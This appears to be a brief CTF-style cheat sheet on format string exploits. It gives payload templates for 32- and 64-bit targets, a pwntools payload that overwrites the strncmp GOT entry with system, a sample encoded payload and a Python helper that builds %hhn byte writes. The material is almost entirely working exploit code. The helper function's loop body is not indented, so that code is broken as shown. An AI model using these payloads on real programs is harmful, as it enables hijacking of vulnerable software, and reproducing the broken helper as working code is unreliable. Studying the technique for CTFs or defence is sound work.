
32bit exploit:

```
[padding][address]%[value]c%[index]$[write_type]
```

64bit exploit:

```
%[value]c%[index]$[write_type][padding][address]
```

pwntools
```python
writes = {got_strncmp:   system}
#format_string = b'AAAA' + b'%11$p'
format_string = fmtstr_payload(11, writes)

#result 32bits
#'%115c%22$hhn%93c%23$hhn%6c%24$hhn%33c%25$hhn\x8d\x9d\x04\x08\x8c\x9d\x04\x08\x8e\x9d\x04\x08\x8f\x9d\x04\x08'
```

Format string with addresses written first
```python
def get_byte(value, n):
	return (value & (0xff << 8 * n)) >> (8 * n)

def fmt_str32(addr, value, offset):
	byte = [
	(get_byte(value, 0), 0),
	(get_byte(value, 1), 1),
	(get_byte(value, 2), 2),
	(get_byte(value, 3), 3),
	]
	byte.sort(key = lambda x:x[0])
	
	ret = p32(addr) + p32(addr + 1) + p32(addr + 2) + p32(addr + 3)
	written = len(ret)
	
	for b in byte:
	ret += f"%{b[0] - written}c%{offset + b[1]}$hhn".encode()
	written += b[0] - written
	
	return ret
```